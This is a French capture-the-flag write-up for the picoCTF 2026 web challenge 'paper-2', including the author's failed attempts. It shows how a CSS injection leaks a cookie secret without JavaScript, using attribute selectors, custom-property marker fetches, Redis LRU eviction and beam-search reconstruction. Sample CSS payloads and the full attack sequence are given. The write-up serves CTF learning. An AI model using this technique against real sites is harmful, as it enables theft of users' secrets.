## Introduction

paper-2 est le challenge le plus difficile de picoCTF 2026. Il s'agit d'un challenge web qui combine plusieurs techniques avancées : injection CSS, XS-Leak via l'éviction LRU de Redis, et beam search pour reconstruire un secret de 32 caractères. Ce writeup retrace **mon parcours complet** — y compris les fausses pistes — jusqu'à la solution.

---

## Analyse du code source

L'application est une Bun.js app avec Redis. Voici les endpoints critiques :

### `/secret` — Le point d'injection

```typescript
'/secret': async (req: BunRequest): Promise<Response> => {
    const secret = req.cookies.get('secret') || '0123456789abcdef'.repeat(2);
    const payload = new URL(req.url, 'http://127.0.0.1').searchParams.get('payload') || '';
    return new Response(
        `<body secret="${secret}">${secret}\n${payload}</body>`,
        headers('text/html')
    );
},
```

Le secret du cookie est placé dans l'**attribut HTML** `<body secret="...">` **et** dans le corps de la page. Le paramètre `payload` est injecté directement dans le body — c'est notre point d'injection HTML/CSS.

### `/flag` — La contrainte 

```typescript
'/flag': async (req: BunRequest): Promise<Response> => {
    const guess = new URL(req.url, 'http://127.0.0.1').searchParams.get('secret');
    const secret = await redis.getdel('secret');  //  le secret est supprimé immédiatement
    if (secret && secret === guess) {
        return new Response(Bun.env.FLAG, headers('text/plain'));
    }
    return new Response('wrong', headers('text/plain'));
},
```

`redis.getdel()` : **une seule tentative possible**. Si je me trompe, le secret est détruit.

### `/upload` et `/paper/:id` — Le stockage de contenu

```typescript
// Upload : stocké avec TTL 10 minutes
const data = JSON.stringify([file.type, (await file.bytes()).toBase64()]);
await redis.set(`file|${id}`, data, 'EX', 10 * 60);

// Serving : le content-type uploadé est PRÉSERVÉ
const [type, data] = JSON.parse(res) as [string, string];
return new Response(Buffer.from(data, 'base64'), headers(type));
```

Le serveur **préserve le content-type** de l'upload. Un fichier uploadé comme `text/css` sera bien servi comme `text/css` — important pour la suite.

### Le bot et ses contraintes

```typescript
browser = await puppeteer.launch({
    args: ['--js-flags=--noexpose_wasm,--jitless', ...]
});
await browser.setCookie({ name: 'secret', value: secret, domain: host, sameSite: 'Strict' });
```

Et la politique Chrome :
```json
{
    "URLBlocklist": ["*"],
    "URLAllowlist": ["https://web"]
}
```

La **Content Security Policy** bloque tout JavaScript (`script-src 'none'`), le cookie est `SameSite: Strict`, et le bot ne peut pas naviguer vers des URLs externes. Le secret n'est valide que **60 secondes**.

### docker-compose.yml — L'indice 

```yaml
redis:
  command: redis-server --maxmemory 512M --maxmemory-policy allkeys-lru --save "" --appendonly no
```

`allkeys-lru` : quand Redis atteint 512MB, il évicte les clés les moins récemment utilisées.

## Fausses pistes

### Tentative 1 : Oracle CSS préfixe + Redis MONITOR (local uniquement)

La première idée était de leaker un caractère par visite avec :

```css
body[secret^="PREFIXc"] #t { background: url('/paper/FLOOD_ID_1'), ..., url('/paper/FLOOD_ID_N') }
```

En chargeant N papers conditionnellement selon le préfixe, le Redis MONITOR local révèle quel sélecteur a matché. **Ça marche en local** — mais le Redis MONITOR n'est pas accessible à distance.

**Problème :** 32 chars × 61 secondes = ~35 minutes minimum, et l'oracle ne fonctionne pas à distance.

### Tentative 2 : Timing attack ("Stop Hitting Yourself")

Inspiré du writeup de justinsteven pour Elements 2024, l'idée était de mesurer la **durée d'élévation de latence** depuis l'extérieur : plus le bot charge de papers (N dépend du caractère), plus Redis est lent, plus nos probes externes sont lentes.

Résultat des tests :
```
[*] Baseline: 523.0ms (depuis Paris)
t=1.0s: 392ms  t=2.0s: 492ms  t=3.0s: 389ms
[*] 127 probes, 0 elevated (0ms total)
```

**Raison de l'échec :** Le bot accède au serveur en **loopback** (~0.01ms par requête), donc aucun ralentissement observable depuis l'extérieur. Avec 310-523ms de RTT réseau, le signal (~33ms) est complètement noyé dans le bruit.

### Tentative 3 : LRU eviction naïve

L'idée : uploader des **sentinels** (1 paper par hex char), faire accéder le bon par le bot (il devient récent), puis flooder Redis pour que les anciens soient évictés. Vérifier lesquels survivent.

Problèmes rencontrés :
1. **Sentinels trop petits** (1 byte) : quand Redis évicte pour libérer 96KB, il préfère toujours évicterles gros papers de 64KB. Un sentinel de 64 bytes ne libère presque rien.
2. **Ordre d'upload** : les sentinels uploadés avant le flood étaient les plus vieux et auraient dû être évictés, mais les expired keys des sessions précédentes les "protégeaient".
3. **Expired keys** : Redis évicte en priorité les clés expirées (très vieilles en LRU), laissant nos sentinels intacts.
4. **Canary toujours présent** : après 30,000 uploads de bait, le canary (ID 1) était encore là — Redis s'était contenté d'évicterles expired keys des sessions précédentes.

## La vraie solution

### Étape 1 : CSS custom properties comme oracle multi-match

Le problème avec `background-image: url(A), url(B)` est que si plusieurs sélecteurs matchent, **le dernier écrase les précédents**. La solution : les **CSS custom properties**.

```css
/* Chaque sélecteur set une variable indépendante */
body[secret*="abc"] { --m_abc: url('/paper/4521'); }
body[secret*="abd"] { --m_abd: url('/paper/4522'); }
body[secret*="xyz"] { --m_xyz: url('/paper/4523'); }

/* Un élément trigger les charge toutes */
#t {
  background-image:
    var(--m_abc, none),
    var(--m_abd, none),
    var(--m_xyz, none);
}
```

Si `--m_abc` n'a jamais été défini (sélecteur non-matchant), `var()` retourne `none` → pas de requête HTTP. Si elle a été définie → le browser fetche `/paper/4521` → Redis marque cette clé comme **recently used**.

### Étape 2 : Trigrams, bigrams, préfixes/suffixes

Au lieu d'un caractère par visite, je teste **toutes les sous-chaînes de 3 chars hex possibles** (trigrams) en une seule visite :

- **Trigrams** `body[secret*="abc"]` : 16³ = 4096 combinaisons. ~30 trigrams qui matchent permettent de reconstruire les 32 chars.
- **Bigrams** `body[secret*="ab"]` : 16² = 256 combinaisons. Complète les trigrams.
- **Préfixes** `body[secret^="ab"]` et **suffixes** `body[secret$="ef"]` : nécessaires car `*=` ne peut pas différencier les positions de début/fin.
- **Contrôles positifs** `body[secret]` : toujours vrai (l'attribut existe).
- **Contrôles négatifs** `body[secret*="ggg"]` : jamais vrai ('g' n'est pas un char hex).

Total : ~5,024 patterns uniques × 3 répliques = **~15,000 markers** à uploader.

### Étape 3 : Séquencement LRU correct

L'ordre exact des opérations est crucial :

```
1. Upload ~15,000 markers (fichiers de ~2KB chacun)
2. Upload CSS + launcher HTML
3. Prefill : upload 4,200 garbage files (64KB chacun)
   → Redis approche 512MB
4. Re-upload CSS + launcher (ils ont peut-être été évictés par le prefill)
5. Trigger bot
   → Bot visite le launcher → redirect vers /secret → CSS s'exécute
   → Les selectors matchants fetched leurs markers → LRU clock refresh
6. Wait ~10s (laisser le CSS s'exécuter complètement)
7. Flood : upload 1,400 files supplémentaires
   → Redis dépasse 512MB → LRU s'active
   → Les markers NON-accédés sont évictés (vieux LRU clock)
   → Les markers ACCÉDÉS survivent (LRU clock récent)
8. Probe tous les markers : 200 = survécu, 404 = évicté
```

**Pourquoi 4,200 + 1,400 et pas tout d'un coup ?** Les markers doivent être uploadés **avant** le prefill pour qu'ils soient plus vieux que les garbage files. Après le prefill, il faut re-uploader CSS + launcher pour qu'ils existent encore quand le bot visite. Le flood final de 1,400 est juste ce qu'il faut pour dépasser la limite sans tout évincer.

```
After Bot Visit (before flood)       After Flood + LRU Eviction
marker_abc  · untouched         →    marker_abc  · ✗ évicté
marker_abd  · untouched         →    marker_abd  · ✗ évicté
marker_def  · ✓ CSS loaded      →    marker_def  · ✓ survit
... 14,997 autres · untouched   →    ... 14,997  · ✗ évictés
4,200 garbage files             →    1,400 nouveaux garbage files
```

### Étape 4 : Reconstruction probabiliste

Après probing, j'obtient ~50-60 markers survivants. Ils indiquent quelles sous-chaînes sont dans le secret. Mais il y a du bruit :
- Des markers peuvent survivre **par chance** (probabilité d'éviction non nulle même pour les non-accédés)
- Des markers peuvent être évictés **malgré l'accès** s'ils ont été uploadés tôt et ont vieilli

#### Log-Likelihood Ratio (LLR)

Les contrôles permettent de calibrer le signal :

```python
t_hist = [0, 0, 0, 0]  # contrôles positifs : distribution du nb de répliques survivantes
f_hist = [0, 0, 0, 0]  # contrôles négatifs

for ctrl in always_match_controls:
    k = sum(1 for r in ctrl.replicas if r in alive_ids)
    t_hist[k] += 1
for ctrl in never_match_controls:
    k = sum(1 for r in ctrl.replicas if r in alive_ids)
    f_hist[k] += 1

# Score LLR pour k répliques survivantes
llr = [log(t_hist[k] / sum(t_hist)) - log(f_hist[k] / sum(f_hist)) for k in range(4)]
```

#### Age bias correction

Les markers uploadés en premier ont plus de chance d'être évictés (même s'ils ont été accédés) car ils sont "vieux" comparé aux derniers uploads. On normalise les scores par groupe temporel.

#### Beam search (width=3000)

```
1. Seed : tous les 4096 préfixes hex de 3 chars, scorés par trigram LLR
2. Étendre d'1 char → scorer le nouveau trigram/bigram
3. Garder les top 3000 candidats
4. Répéter jusqu'à 32 chars
5. Ajouter les scores suffixes → re-rank final
```

Pénalité si un trigram est répété (évite `abcabcabc...`). Le top-1 candidat est soumis à `/flag`. En pratique, ~10 runs sont nécessaires pour trouver le bon secret.

## Ce que j'ai appris / Erreurs commises

### Pourquoi mon approche LRU naïve échouait

Mon erreur principale était d'utiliser des **sentinels d'1 byte**. En théorie, ils devraient être évictés en premier (les plus vieux en LRU). En pratique :

- Redis évicte des clés **jusqu'à ce que la mémoire soit libérée**
- Évicterun sentinel de 64B libère 64B → Redis doit évicterplein d'autres clés pour atteindre les 96KB nécessaires
- Évicterun garbage paper de 96KB libère 96KB → suffisant en une éviction

En pratique, Redis "préfère" donc toujours les gros papers. Les petits sentinels sont dans un angle mort statistique.

### le timing attack échouait

La latence réseau (310ms+) domine complètement le signal (~33ms par char). Même depuis un VPS US-East proche du serveur, le ratio signal/bruit était insuffisant. L'approche LRU est beaucoup plus robuste car elle convertit le problème en **présence/absence** (binaire) plutôt qu'en mesure de temps.

### La clé ignorée : `*=` vs `^=`

Je m'était fixé sur les sélecteurs **préfixe** (`^=`) nécessitant 32 rounds de 61s. Les sélecteurs **contains** (`*=`) avec trigrams permettent d'extraire presque tout le secret en une seule visite. C'est un changement de paradigme fondamental.

## Conclusion

paper-2 est une masterclass en XS-Leak sans serveur externe. La solution combine :

1. **CSS attribute selectors** comme oracle (sans JS)
2. **CSS custom properties** pour des sélecteurs multiples non-conflictuels  
3. **LRU Redis** comme side-channel observable
4. **Reconstruction probabiliste** (LLR + beam search) pour gérer le bruit

Le défi n'est pas de trouver la vulnérabilité (CSS injection sur `/secret` est évidente), mais de construire un canal de communication fiable depuis ce point d'injection vers un observateur externe, sans JavaScript, sans réseau externe, et en déduisant 32 chars en une seule tentative.
